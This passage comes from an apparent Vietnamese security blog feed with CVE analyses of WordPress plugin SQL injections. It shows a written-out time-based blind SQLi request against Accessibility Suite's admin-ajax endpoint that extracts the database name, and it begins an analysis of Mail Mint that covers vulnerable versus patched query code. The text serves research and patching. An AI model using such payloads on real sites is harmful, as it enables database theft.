nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong m·ªánh ƒë·ªÅ WHERE&lt;/strong&gt;: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi &lt;code&gt;SLEEP()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong m·ªánh ƒë·ªÅ FROM&lt;/strong&gt;: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34;&#xA;    alt=&#34;SQL Execution Order Diagram&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;SQL Execution Order Diagram&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;SUBSTRING()&lt;/code&gt; ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;SLEEP(5)&lt;/code&gt; n·∫øu k√Ω t·ª± ƒë√≥ l√† &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng hex encoding &lt;code&gt;w&lt;/code&gt; th√†nh &lt;code&gt;0x77&lt;/code&gt; v√¨ nh∆∞ ph√¢n t√≠ch &lt;a href=&#34;#how-it-work&#34;&gt;·ªü tr√™n&lt;/a&gt;, &lt;code&gt;scan_id&lt;/code&gt; s·∫Ω b·ªã escape.&lt;/p&gt;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-32650&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Accessibility Suite&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;4.19&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Accessibility Suite Plugin &amp;lt;= 4.18 is vulnerable to SQL Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58604 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-25-cve-2025-58604/</link>
      <pubDate>Thu, 25 Sep 2025 21:13:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-25-cve-2025-58604/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Mail Mint&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.18.6&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58604&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58604&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mail-mint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.18.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mail Mint&lt;/strong&gt;:  v1.18.5(vul) v√† v1.18.6(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† &lt;strong&gt;kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá&lt;/strong&gt; khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;/app/Utilities/Helper/Import.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    $total_query = &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&amp;#34;;&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query to retrieve user IDs with limit and offset.&#xA;    $final_query = &amp;#34;SELECT user_id&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&#xA;                    GROUP BY user_id&#xA;                    LIMIT $number OFFSET $offset&amp;#34;;&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    // Total query (safe with prepare)&#xA;    $total_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&amp;#34;,&#xA;        $keys&#xA;    );&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query with LIMIT &amp;amp; OFFSET (safe with prepare)&#xA;    $final_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT user_id&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&#xA;        GROUP BY user_id&#xA;        LIMIT %d OFFSET %d&amp;#34;,&#xA;        array_merge($keys, array($number, $offset))&#xA;    );&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt; c·ªßa class &lt;code&gt;Import&lt;/code&gt;. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a &lt;code&gt;get_wp_users_by_learndash_with_limit_offset&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_import.png&#34;&#xA;    alt=&#34;Search Import&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Import&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;K·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;perform_learndash_user_import()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;thu·ªôc class &lt;code&gt;ContactImportAction&lt;/code&gt; trong file &lt;strong&gt;/app/API/Actions/Admin/Contact/ContactImportAction.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i &lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a &lt;code&gt;retrieve_contacts_associated_with_learndash&lt;/code&gt; trong th∆∞ m·ª•c plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 1&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;H√†m n√†y ƒë∆∞·ª£c g·ªçi trong &lt;code&gt;map_contacts_with_learndash()&lt;/code&gt; thu·ªôc class &lt;code&gt;ContactImportController&lt;/code&gt; trong file &lt;strong&gt;/app/API/Controllers/Admin/Contact/ContactImportController.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a &lt;code&gt;map_contacts_with_learndash&lt;/code&gt; ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_2.png&#34;&#xA;    alt=&#34;Search 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 2&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m &lt;code&gt;register_rest_route()&lt;/code&gt; trong WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ContactImportRoute extends AdminRoute {&#xA;    public function register_routes() {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace, // mrm/v1&#xA;            $this-&amp;gt;rest_base . &amp;#39;/learndash/map&amp;#39;, // contacts/import/learndash/map/&#xA;            array(&#xA;                array(&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; array( $this-&amp;gt;controller, &amp;#39;map_contacts_with_learndash&amp;#39; ),&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; PermissionManager::current_user_can(&amp;#39;mint_manage_contacts&amp;#39;), // Admin&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                        &amp;#39;selectedCourses&amp;#39; =&amp;gt; array(&#xA;                            &amp;#39;description&amp;#39; &#x9;&#x9;=&amp;gt; __( &amp;#39;The selected courses from which to import contacts.&amp;#39;, &amp;#39;mrm&amp;#39; ),&#xA;                            &amp;#39;required&amp;#39;    &#x9;&#x9;=&amp;gt; true,&#xA;                            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;array&amp;#39;,&#xA;                            &amp;#39;sanitize_callback&amp;#39; =&amp;gt; &amp;#39;rest_sanitize_array&amp;#39;,&#xA;                            )&#xA;                        ), // array &amp;#43; required&#xA;                ),&#xA;            )&#xA;        );&#xA;        // other logic&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Lu·ªìng g·ªçi h√†m&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;POST /wp-json/mrm/v1/contacts/import/learndash/map&lt;/code&gt; ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc &lt;code&gt;selectedCourses&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;map_contacts_with_learndash(WP_REST_Request $request)&lt;/code&gt; l√† callback ƒë∆∞·ª£c g·ªçi:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nh·∫≠n &lt;code&gt;$request&lt;/code&gt; l√†m tham s·ªë ƒë·∫ßu v√†o.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y c√°c tham s·ªë c·ªßa &lt;code&gt;$request&lt;/code&gt; chuy·ªÉn th√†nh m·∫£ng &lt;code&gt;$params&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Callback g·ªçi &lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; v·ªõi ƒë·ªëi s·ªë l√† 